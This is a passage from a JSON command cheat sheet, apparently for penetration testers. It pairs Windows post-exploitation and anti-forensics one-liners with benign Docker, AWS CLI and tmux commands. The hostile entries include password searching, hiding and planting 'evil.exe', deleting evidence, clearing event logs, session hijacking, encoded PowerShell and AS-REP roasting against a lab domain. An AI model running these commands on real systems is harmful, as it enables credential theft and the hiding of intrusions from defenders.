      "Command": "whoami /all",
      "OS": "Windows"
    },
    {
      "Name": "Get System Details",
      "Category": 17,
      "Description": "Get system details",
      "Command": "systeminfo",
      "OS": "Windows"
    },
    {
      "Name": "List Processes with Details",
      "Category": 17,
      "Description": "List processes with details",
      "Command": "tasklist /v",
      "OS": "Windows"
    },
    {
      "Name": "Enumerate Files",
      "Category": 17,
      "Description": "Enumerate files",
      "Command": "dir /s /b c:\\ > files.txt",
      "OS": "Windows"
    },
    {
      "Name": "Search for Credentials",
      "Category": 17,
      "Description": "Search for creds",
      "Command": "findstr /si password *.txt",
      "OS": "Windows"
    },
    {
      "Name": "Read File Content",
      "Category": 17,
      "Description": "Read file contents",
      "Command": "type secret.txt",
      "OS": "Windows"
    },
    {
      "Name": "List Drivers",
      "Category": 17,
      "Description": "List drivers",
      "Command": "driverquery",
      "OS": "Windows"
    },
    {
      "Name": "List Drives",
      "Category": 17,
      "Description": "List drives",
      "Command": "fsutil fsinfo drives",
      "OS": "Windows"
    },
    {
      "Name": "Show Group Policy",
      "Category": 17,
      "Description": "Show group policy",
      "Command": "gpresult /r",
      "OS": "Windows"
    },
    {
      "Name": "Roast AS-REP Hashes",
      "Category": 12,
      "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.11.11.162 -usersfile ./users -request -format hashcat -outputfile hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Get Domain LDAP Anon",
      "Category": 12,
      "Description": "Get's the default naming context and displays the domain name",
      "Command": "ldapsearch -x -H ldap://10.11.11.162 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext",
      "OS": "Linux"
    },
    {
      "Name": "Domain Controller Query",
      "Category": 12,
      "Description": "Domain controller info",
      "Command": "netdom query dc",
      "OS": "Windows"
    },
    {
      "Name": "Domain Trust Details",
      "Category": 12,
      "Description": "Domain trust details",
      "Command": "nltest /dsgetdc:domain",
      "OS": "Windows"
    },
    {
      "Name": "Query AD Objects",
      "Category": 12,
      "Description": "Query AD objects",
      "Command": "dsquery * -limit 0",
      "OS": "Windows"
    },
    {
      "Name": "List User Sessions",
      "Category": 17,
      "Description": "List user sessions",
      "Command": "query user",
      "OS": "Windows"
    },
    {
      "Name": "Port Forwarding with Netsh",
      "Category": 17,
      "Description": "Port forwarding",
      "Command": "netsh interface portproxy add v4tov4 listenport=80 connectport=8080 connectaddress=127.0.0.1",
      "OS": "Windows"
    },
    {
      "Name": "Remote Desktop Connection",
      "Category": 17,
      "Description": "Remote desktop",
      "Command": "mstsc /v:192.168.1.1",
      "OS": "Windows"
    },
    {
      "Name": "Copy Files",
      "Category": 17,
      "Description": "Copy files",
      "Command": "copy evil.exe c:\\windows\\temp",
      "OS": "Windows"
    },
    {
      "Name": "Move Files",
      "Category": 17,
      "Description": "Move files",
      "Command": "move evil.exe c:\\windows\\system32",
      "OS": "Windows"
    },
    {
      "Name": "Delete Files",
      "Category": 17,
      "Description": "Delete files",
      "Command": "del evidence.txt",
      "OS": "Windows"
    },
    {
      "Name": "Create Files",
      "Category": 17,
      "Description": "Create files",
      "Command": "echo PAYLOAD > evil.bat",
      "OS": "Windows"
    },
    {
      "Name": "Hide Files",
      "Category": 17,
      "Description": "Hide files",
      "Command": "attrib +h evil.exe",
      "OS": "Windows"
    },
    {
      "Name": "Modify Permissions",
      "Category": 17,
      "Description": "Modify permissions",
      "Command": "icacls file.exe /grant hacker:f",
      "OS": "Windows"
    },
    {
      "Name": "Take Ownership",
      "Category": 17,
      "Description": "Take ownership",
      "Command": "takeown /f file.exe",
      "OS": "Windows"
    },
    {
      "Name": "Share Files",
      "Category": 17,
      "Description": "Share files",
      "Command": "net share evil=c:\\evil /grant:hacker,full",
      "OS": "Windows"
    },
    {
      "Name": "Create Directories",
      "Category": 17,
      "Description": "Create directories",
      "Command": "mkdir c:\\hidden",
      "OS": "Windows"
    },
    {
      "Name": "Remove Directories",
      "Category": 17,
      "Description": "Remove directories",
      "Command": "rmdir /s /q c:\\evidence",
      "OS": "Windows"
    },
    {
      "Name": "Rename Files",
      "Category": 17,
      "Description": "Rename files",
      "Command": "ren evil.exe legit.exe",
      "OS": "Windows"
    },
    {
      "Name": "Copy with Attributes",
      "Category": 17,
      "Description": "Copy with attributes",
      "Command": "xcopy evil.exe c:\\windows /h /c",
      "OS": "Windows"
    },
    {
      "Name": "Mirror Directories",
      "Category": 17,
      "Description": "Mirror directories",
      "Command": "robocopy c:\\source c:\\dest evil.exe /mir",
      "OS": "Windows"
    },
    {
      "Name": "Replace Files",
      "Category": 17,
      "Description": "Replace files",
      "Command": "replace evil.exe c:\\windows /u",
      "OS": "Windows"
    },
    {
      "Name": "Compress to CAB",
      "Category": 17,
      "Description": "Compress to CAB",
      "Command": "makecab evil.exe evil.cab",
      "OS": "Windows"
    },
    {
      "Name": "Extract Files",
      "Category": 17,
      "Description": "Extract files",
      "Command": "extrac32 evil.cab",
      "OS": "Windows"
    },
    {
      "Name": "Encode Payloads",
      "Category": 17,
      "Description": "Encode payloads",
      "Command": "powershell -enc <base64>",
      "OS": "Windows"
    },
    {
      "Name": "Clear System Logs",
      "Category": 17,
      "Description": "Clear logs",
      "Command": "wevtutil cl System",
      "OS": "Windows"
    },
    {
      "Name": "Create Fake Logs",
      "Category": 17,
      "Description": "Create fake logs",
      "Command": "eventcreate /t ERROR /id 100 /l APPLICATION /d \"Fake\"",
      "OS": "Windows"
    },
    {
      "Name": "Disable Hibernate Logs",
      "Category": 17,
      "Description": "Disable hibernate logs",
      "Command": "powercfg /hibernate off",
      "OS": "Windows"
    },
    {
      "Name": "Map Drives for Obfuscation",
      "Category": 17,
      "Description": "Map drives for obfuscation",
      "Command": "subst z: c:\\evil",
      "OS": "Windows"
    },
    {
      "Name": "Kill Processes",
      "Category": 17,
      "Description": "Kill processes",
      "Command": "taskkill /im process.exe /f",
      "OS": "Windows"
    },
    {
      "Name": "Reboot System",
      "Category": 17,
      "Description": "Reboot system",
      "Command": "shutdown /r /t 0",
      "OS": "Windows"
    },
    {
      "Name": "Manage Disks",
      "Category": 17,
      "Description": "Manage disks",
      "Command": "diskpart",
      "OS": "Windows"
    },
    {
      "Name": "Check Disk",
      "Category": 17,
      "Description": "Check disk",
      "Command": "chkdsk c: /f",
      "OS": "Windows"
    },
    {
      "Name": "Scan System Files",
      "Category": 17,
      "Description": "Scan system files",
      "Command": "sfc /scannow",
      "OS": "Windows"
    },
    {
      "Name": "Enable SAM Encryption",
      "Category": 17,
      "Description": "Enable SAM encryption",
      "Command": "syskey",
      "OS": "Windows"
    },
    {
      "Name": "Create Shadow Copies",
      "Category": 17,
      "Description": "Create shadow copies",
      "Command": "vssadmin create shadow /for=c:",
      "OS": "Windows"
    },
    {
      "Name": "Compare Files",
      "Category": 17,
      "Description": "Compare files",
      "Command": "comp file1 file2",
      "OS": "Windows"
    },
    {
      "Name": "Compare File Differences",
      "Category": 17,
      "Description": "Compare file differences",
      "Command": "fc file1 file2",
      "OS": "Windows"
    },
    {
      "Name": "Sort Data",
      "Category": 17,
      "Description": "Sort data",
      "Command": "sort < input.txt > output.txt",
      "OS": "Windows"
    },
    {
      "Name": "Encrypt Files",
      "Category": 17,
      "Description": "Encrypt files",
      "Command": "cipher /e file.txt",
      "OS": "Windows"
    },
    {
      "Name": "List Sessions",
      "Category": 17,
      "Description": "List sessions",
      "Command": "qwinsta",
      "OS": "Windows"
    },
    {
      "Name": "Reset Session",
      "Category": 17,
      "Description": "Reset session",
      "Command": "rwinsta 1",
      "OS": "Windows"
    },
    {
      "Name": "Hijack Session",
      "Category": 17,
      "Description": "Hijack session",
      "Command": "tscon 1 /dest:console",
      "OS": "Windows"
    },
    {
      "Name": "Kill Tasks",
      "Category": 17,
      "Description": "Kill tasks",
      "Command": "tskill processname",
      "OS": "Windows"
    },
    {
      "Name": "End Session",
      "Category": 17,
      "Description": "End session",
      "Command": "logoff 1",
      "OS": "Windows"
    },
    {
      "Name": "Set Audit Policy",
      "Category": 17,
      "Description": "Set audit policy",
      "Command": "auditpol /set /category:\"Logon\" /success:enable",
      "OS": "Windows"
    },
    {
      "Name": "Export Security Config",
      "Category": 17,
      "Description": "Export security config",
      "Command": "secedit /export /cfg config.txt",
      "OS": "Windows"
    },
    {
      "Name": "Record Screen",
      "Category": 17,
      "Description": "Record screen",
      "Command": "psr /start /output record.zip /sc 1",
      "OS": "Windows"
    },
    {
      "Name": "Open Explorer",
      "Category": 17,
      "Description": "Open explorer",
      "Command": "explorer c:\\evil",
      "OS": "Windows"
    },
    {
      "Name": "Launch Control Panel",
      "Category": 17,
      "Description": "Launch control panel",
      "Command": "control",
      "OS": "Windows"
    },
    {
      "Name": "Send Messages",
      "Category": 17,
      "Description": "Send messages",
      "Command": "msg * \"Warning\"",
      "OS": "Windows"
    },
    {
      "Name": "Modify PATH",
      "Category": 17,
      "Description": "Modify PATH",
      "Command": "set PATH=%PATH%;C:\\evil",
      "OS": "Windows"
    },
    {
      "Name": "Run Nginx Server Docker",
      "Category": 22,
      "Description": "Run an Nginx server.",
      "Command": "docker run -d -p 80:80 nginx",
      "OS": "Linux"
    },
    {
      "Name": "Download WordPress Image Docker",
      "Category": 22,
      "Description": "Download WordPress image.",
      "Command": "docker pull wordpress:latest",
      "OS": "Linux"
    },
    {
      "Name": "Launch WordPress Docker",
      "Category": 22,
      "Description": "Launch WordPress.",
      "Command": "docker run -d --name wp -p 8080:80 wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Build Custom WordPress Image Docker",
      "Category": 22,
      "Description": "Build a custom WordPress image.",
      "Command": "docker build -t my-wp-site:latest .",
      "OS": "Linux"
    },
    {
      "Name": "Upload to Registry Docker",
      "Category": 22,
      "Description": "Upload to a registry.",
      "Command": "docker push myrepo/my-wp-site:latest",
      "OS": "Linux"
    },
    {
      "Name": "Start Ubuntu Shell Docker",
      "Category": 22,
      "Description": "Start an Ubuntu shell.",
      "Command": "docker run -it ubuntu bash",
      "OS": "Linux"
    },
    {
      "Name": "Access WordPress Container Docker",
      "Category": 22,
      "Description": "Access WordPress container.",
      "Command": "docker exec -it wp bash",
      "OS": "Linux"
    },
    {
      "Name": "Monitor WordPress Logs Docker",
      "Category": 22,
      "Description": "Monitor WordPress logs.",
      "Command": "docker logs -f wp",
      "OS": "Linux"
    },
    {
      "Name": "Run MySQL Server Docker",
      "Category": 22,
      "Description": "Run MySQL server.",
      "Command": "docker run -d -p 3306:3306 mysql",
      "OS": "Linux"
    },
    {
      "Name": "Persist WordPress Data Docker",
      "Category": 22,
      "Description": "Persist WordPress data.",
      "Command": "docker run -v wp-data:/var/www/html wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Create WordPress Network Docker",
      "Category": 22,
      "Description": "Create a WordPress network.",
      "Command": "docker network create wp-net",
      "OS": "Linux"
    },
    {
      "Name": "Run in Custom Network Docker",
      "Category": 22,
      "Description": "Run in custom network.",
      "Command": "docker run --network wp-net wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Stop All Containers Docker",
      "Category": 22,
      "Description": "Stop all containers.",
      "Command": "docker stop $(docker ps -q)",
      "OS": "Linux"
    },
    {
      "Name": "Remove All Containers Docker",
      "Category": 22,
      "Description": "Remove all containers.",
      "Command": "docker rm $(docker ps -a -q)",
      "OS": "Linux"
    },
    {
      "Name": "Remove All Images Docker",
      "Category": 22,
      "Description": "Remove all images.",
      "Command": "docker rmi $(docker images -q)",
      "OS": "Linux"
    },
    {
      "Name": "Auto-Restart WordPress Docker",
      "Category": 22,
      "Description": "Auto-restart WordPress.",
      "Command": "docker run -d --restart always wp",
      "OS": "Linux"
    },
    {
      "Name": "Get Container IP Docker",
      "Category": 22,
      "Description": "Get container IP.",
      "Command": "docker inspect --format '{{.NetworkSettings.IPAddress}}' wp",
      "OS": "Linux"
    },
    {
      "Name": "Set Database Host Docker",
      "Category": 22,
      "Description": "Set database host.",
      "Command": "docker run -e WORDPRESS_DB_HOST=mysql wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Limit Container Memory Docker",
      "Category": 22,
      "Description": "Limit container memory.",
      "Command": "docker run --memory 256m wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Limit Container CPU Docker",
      "Category": 22,
      "Description": "Limit container CPU.",
      "Command": "docker run --cpus 1 wordpress",
      "OS": "Linux"
    },
    {
      "Name": "Create S3 Bucket and Upload File AWS",
      "Category": 23,
      "Description": "Creates a new S3 bucket and uploads a file, useful for testing bucket permissions and data exposure.",
      "Command": "aws s3 mb s3://mybucket aws s3 cp localfile.txt s3://mybucket/",
      "OS": "Win/Lin"
    },
    {
      "Name": "List All S3 Buckets AWS",
      "Category": 23,
      "Description": "Lists all S3 buckets in the account, helping identify misconfigured or publicly accessible buckets.",
      "Command": "aws s3 ls",
      "OS": "Win/Lin"
    },
    {
      "Name": "Download File from S3 AWS",
      "Category": 23,
      "Description": "Downloads a file from an S3 bucket, useful for verifying access controls.",
      "Command": "aws s3 cp s3://mybucket/file.txt localfile.txt",
      "OS": "Win/Lin"
    },
    {
      "Name": "Sync Local Directory with S3 Bucket AWS",
      "Category": 23,
      "Description": "Synchronizes a local directory with an S3 bucket, ideal for backing up data or testing sync permissions.",
      "Command": "aws s3 sync localdir s3://mybucket/",
      "OS": "Win/Lin"
    },
    {
      "Name": "Launch EC2 Instance AWS",
      "Category": 23,
      "Description": "Launches a new EC2 instance, useful for setting up test environments or simulating attacker infrastructure.",
      "Command": "aws ec2 run-instances --image-id ami-123 --count 1 --instance-type t2.micro --key-name MyKey --security-group-ids sg-123 --subnet-id subnet-123",
      "OS": "Win/Lin"
    },
    {
      "Name": "Terminate EC2 Instance AWS",
      "Category": 23,
      "Description": "Terminates an EC2 instance, ensuring cleanup after testing to prevent unauthorized access.",
      "Command": "aws ec2 terminate-instances --instance-ids i-123",
      "OS": "Win/Lin"
    },
    {
      "Name": "Describe All EC2 Instances AWS",
      "Category": 23,
      "Description": "Lists all EC2 instances, helping identify running instances and their configurations.",
      "Command": "aws ec2 describe-instances",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create Security Group and Add Rule AWS",
      "Category": 23,
      "Description": "Creates a security group and adds an SSH ingress rule, useful for testing network access controls.",
      "Command": "aws ec2 create-security-group --group-name MySG --description \"My SG\" aws ec2 authorize-security-group-ingress --group-id sg-123 --protocol tcp --port 22 --cidr 0.0.0.0/0",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create IAM User and Attach Policy AWS",
      "Category": 23,
      "Description": "Creates an IAM user and grants S3 read-only access, ideal for testing least privilege principles.",
      "Command": "aws iam create-user --user-name Bob aws iam attach-user-policy --user-name Bob --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess",
      "OS": "Win/Lin"
    },
    {
      "Name": "List All IAM Users AWS",
      "Category": 23,
      "Description": "Lists all IAM users, helping identify unauthorized or dormant accounts.",
      "Command": "aws iam list-users",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create Lambda Function AWS",
      "Category": 23,
      "Description": "Creates a Lambda function, useful for testing serverless application security.",
      "Command": "aws lambda create-function --function-name MyFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip",
      "OS": "Win/Lin"
    },
    {
      "Name": "Invoke Lambda Function AWS",
      "Category": 23,
      "Description": "Invokes a Lambda function, allowing testers to verify function behavior and outputs.",
      "Command": "aws lambda invoke --function-name MyFunction output.txt",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create DynamoDB Table AWS",
      "Category": 23,
      "Description": "Creates a DynamoDB table, useful for testing data storage security.",
      "Command": "aws dynamodb create-table --table-name MyTable --attribute-definitions AttributeName=Id,AttributeType=S --key-schema AttributeName=Id,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5",
      "OS": "Win/Lin"
    },
    {
      "Name": "Insert Item into DynamoDB AWS",
      "Category": 23,
      "Description": "Inserts an item into a DynamoDB table, allowing testers to verify data access controls.",
      "Command": "aws dynamodb put-item --table-name MyTable --item '{\"Id\": {\"S\": \"1\"}, \"Name\": {\"S\": \"John\"}}'",
      "OS": "Win/Lin"
    },
    {
      "Name": "Get Item from DynamoDB AWS",
      "Category": 23,
      "Description": "Retrieves an item from a DynamoDB table, useful for testing read permissions.",
      "Command": "aws dynamodb get-item --table-name MyTable --key '{\"Id\": {\"S\": \"1\"}}'",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create CloudFormation Stack AWS",
      "Category": 23,
      "Description": "Creates a CloudFormation stack, ideal for deploying test infrastructure reproducibly.",
      "Command": "aws cloudformation create-stack --stack-name MyStack --template-body file://template.yaml",
      "OS": "Win/Lin"
    },
    {
      "Name": "Describe CloudFormation Stack AWS",
      "Category": 23,
      "Description": "Describes a CloudFormation stack, helping verify deployed resources.",
      "Command": "aws cloudformation describe-stacks --stack-name MyStack",
      "OS": "Win/Lin"
    },
    {
      "Name": "Create RDS Database Instance AWS",
      "Category": 23,
      "Description": "Creates an RDS database instance, useful for testing database security configurations.",
      "Command": "aws rds create-db-instance --db-instance-identifier MyDB --db-instance-class db.t2.micro --engine mysql --master-username admin --master-user-password password --allocated-storage 20",
      "OS": "Win/Lin"
    },
    {
      "Name": "List All RDS Database Instances AWS",
      "Category": 23,
      "Description": "Lists all RDS instances, helping identify database configurations and potential vulnerabilities.",
      "Command": "aws rds describe-db-instances",
      "OS": "Win/Lin"
    },
    {
      "Name": "Set Up CloudWatch Alarm for EC2 Instance AWS",
      "Category": 23,
      "Description": "Sets up a CloudWatch alarm for CPU utilization on an EC2 instance.",
      "Command": "aws cloudwatch put-metric-alarm --alarm-name CPUAlarm --metric-name CPUUtilization --namespace AWS/EC2 --statistic Average --period 300 --threshold 80 --comparison-operator GreaterThanThreshold --dimensions Name=InstanceId,Value=i-123 --evaluation-periods 2 --alarm-actions arn:aws:sns:us-east-1:123456789012:MyTopic",
      "OS": "Win/Lin"
    },
    {
      "Name": "Start Tmux Session",
      "Category": 24,
      "Description": "Start a session.",
      "Command": "tmux new-session -s dev",
      "OS": "Linux"
    },
    {
      "Name": "Create Named Window in Tmux",
      "Category": 24,
      "Description": "create a window for vim, name it “code” with Ctrl-b ,.",
      "Command": "Press Ctrl-b c",
      "OS": "Linux"
    },
    {
      "Name": "Split Window in Tmux",
      "Category": 24,
      "Description": "split the window, running python manage.py runserver in the new pane.",
      "Command": "Press Ctrl-b %",
      "OS": "Linux"
    },
    {
      "Name": "Detach and Reconnect Tmux",
      "Category": 24,
      "Description": "detach and reconnect later with tmux attach-session -t dev.",
      "Command": "Press Ctrl-b d",
      "OS": "Linux"
    },
    {
      "Name": "Start Monitoring Session in Tmux",
      "Category": 24,
      "Description": "Start a session with tmux new-session -s monitor.",
      "Command": "tmux new-session -s monitor",
      "OS": "Linux"
    },
    {
      "Name": "Split Horizontally in Tmux",
      "Category": 24,
      "Description": "split horizontally, running htop in the top pane and tail -f /var/log/syslog in the bottom.",
      "Command": "Press Ctrl-b ”",
      "OS": "Linux"
    },
    {
      "Name": "See Pane Numbers in Tmux",
      "Category": 24,
      "Description": "see pane numbers and 1 to switch to the log pane.",
      "Command": "Press Ctrl-b q",
      "OS": "Linux"
    },
    {
      "Name": "Copy Error in Tmux",
      "Category": 24,
      "Description": "Copy an error with Ctrl-b [, select with Space and Enter, then paste into a file with Ctrl-b ].",
      "Command": "Press Ctrl-b [",
      "OS": "Linux"
    },
    {
      "Name": "Create Team Session in Tmux",
      "Category": 24,
      "Description": "Create a session with tmux new-session -s team.",
      "Command": "tmux new-session -s team",
      "OS": "Linux"
    },
    {
      "Name": "Share Tmux Session",
      "Category": 24,
      "Description": "Share the session name and server details with a colleague, who attaches using tmux attach-session -t team.",
      "Command": "tmux attach-session -t team",
      "OS": "Linux"
    },
    {
      "Name": "Open Shared Editor Window in Tmux",
      "Category": 24,
      "Description": "open a window for a shared editor, and Ctrl-b f to find it later by name.",
      "Command": "Press Ctrl-b c",
      "OS": "Linux"
    }
  ]
}